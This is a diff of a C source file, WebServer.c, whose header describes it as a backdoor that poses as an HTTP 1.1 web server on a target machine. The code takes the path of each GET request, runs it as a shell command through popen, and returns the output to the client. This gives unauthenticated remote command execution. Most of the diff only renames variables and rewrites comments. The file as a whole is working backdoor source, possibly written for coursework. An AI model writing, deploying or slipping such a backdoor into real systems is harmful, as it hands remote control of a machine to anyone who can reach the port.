@@ -1,3 +1,13 @@
+/*H*******************************************************************************
+* FILENAME: WebServer.c
+* DESCRIPTION: 
+*             A Backdoor program which runs as a HTTP 1.1 compliant WebServer on Target machine
+* Author: Anirban Bhattacharya 
+*H*/
+#include <unistd.h>
+#include <sys/socket.h>
+
+#include <netinet/in.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <signal.h>
@@ -5,66 +15,64 @@
 #include <errno.h>
 
 #include <sys/types.h>
-#include <sys/socket.h>
 
-#include <netinet/in.h>
 #include <string.h>
 
 int port = 0;
-int server_socket_descriptor;
+int server_socket;
 
-void accept_command(struct sockaddr_in server_address);
+void handle_accept_request(struct sockaddr_in server_address);
 void SIGINT_callback_handler(int signal_num);
 void get_command_from_url(char * url);
 int is_gzip_enabled(const char * str);
 
 int main(int argc, char *argv[]){
-  //check command line arguments
+  //Validate port number has been passed in command line argument
   if(argc < 2){
     printf("Command to Execute: ./normal_web_server <port_number>\nMissing port number.\n");
     exit(1);
   }
   port = atoi(argv[1]);
 
-  //Create a new socket descriptor
-  server_socket_descriptor = socket(AF_INET, SOCK_STREAM, 0);
+  //Create a new socket descriptor for the server
+  server_socket = socket(AF_INET, SOCK_STREAM, 0);
 
   //check if there was an error creating socket.
-  if (server_socket_descriptor == 0)
+  if (server_socket == 0)
   {
       perror("failed to get socket");
       exit(1);
   }
 
-  //register handler for Ctrl + C
+  //register handler for Ctrl + C ,i.e. SIGINT
   signal(SIGINT, SIGINT_callback_handler);
 
-  //create server address
+  //create server socket struct
   struct sockaddr_in server_address;
   server_address.sin_family = AF_INET;
   server_address.sin_port = htons(port);
   server_address.sin_addr.s_addr = INADDR_ANY;
 
-  //bind socket and port
-  int bind_status = bind(server_socket_descriptor, (struct sockaddr *)&server_address, sizeof(server_address));
+  //bind socket and port for server
+  int bind_status = bind(server_socket, (struct sockaddr *)&server_address, sizeof(server_address));
   if(bind_status < 0){
-    perror("Failed to bind socket to port");
+    perror("Binding Socket to port failed may be the port is in Use");
     exit(1);
   }
 
-  //listen to socket
-  int listen_status = listen(server_socket_descriptor, 3);
+  //Server starts listening to the socket for incoming connections
+  int listen_status = listen(server_socket, 3);
   if(listen_status < 0){
-    perror("Failed to listen to port");
+    perror("Cannot to listen to port");
     exit(1);
   }
 
-  accept_command(server_address);
+  handle_accept_request(server_address);
 
   return 0;
 }
 
-void accept_command(struct sockaddr_in server_address){
+void handle_accept_request(struct sockaddr_in server_address){
   char * ok_response_header = "HTTP/1.1 200 OK\n"
                               "Content-Type: text/html\n"
                               "Accept-Ranges: bytes\n"
@@ -78,9 +86,9 @@ void accept_command(struct sockaddr_in server_address){
   char * get_request = "GET";
 
   while(1){
-    //accept incoming requests
+    //accept incoming requests from clients
     int len_of_address = sizeof(server_address);
-    int client_socket_descriptor = accept(server_socket_descriptor, (struct sockaddr *)&server_address, (socklen_t *)&len_of_address);
+    int client_socket_descriptor = accept(server_socket, (struct sockaddr *)&server_address, (socklen_t *)&len_of_address);
 
     char buff[1000];
     char url[1000];
@@ -93,7 +101,7 @@ void accept_command(struct sockaddr_in server_address){
 
     if(strlen(buff)<= 10 || strncmp(get_request, buff, strlen(get_request)) != 0){
       strcpy(response_header, not_found_response_header);
-      strcpy(command_result, "Invalid request only GET is allowed.");
+      strcpy(command_result, "Method Not Supported");
     }
     else{
       int i, j=0;
@@ -109,18 +117,16 @@ void accept_command(struct sockaddr_in server_address){
 
       if(strlen(url) == 0){
         strcpy(response_header, not_found_response_header);
-        strcpy(command_result, "Invalid command!");
+        strcpy(command_result, "Command is Invalid");
       }
       else{
-        //if(is_gzip_enabled(buff)){
-          //strcat(url, " | gzip");
-        //}
+       
         strcat(url, " 2>&1");
         char tmp_buff[1000];
         FILE* file = popen(url, "r");
         if(file == NULL){
           strcpy(response_header, not_found_response_header);
-          strcpy(command_result, "Invalid command!");
+          strcpy(command_result, "Command is Invalid");
         }
         else{
           int flag = 0;
@@ -154,7 +160,7 @@ void accept_command(struct sockaddr_in server_address){
 
     send(client_socket_descriptor, response, strlen(response), 0);
     close(client_socket_descriptor);
-    printf("Message sent:\n%s\n", response);
+    printf("Message sent to client:\n%s\n", response);
 
     //clear all buffers
     memset(buff, 0, sizeof(buff));
@@ -166,9 +172,9 @@ void accept_command(struct sockaddr_in server_address){
 }
 
 void SIGINT_callback_handler(int signal_num){
-  //Release the port
-  close(server_socket_descriptor);
-  shutdown(server_socket_descriptor, 2);
+  //Release the port as CTRL+C is sent
+  close(server_socket);
+  shutdown(server_socket, 2);
 
   //exit program
   exit(0);
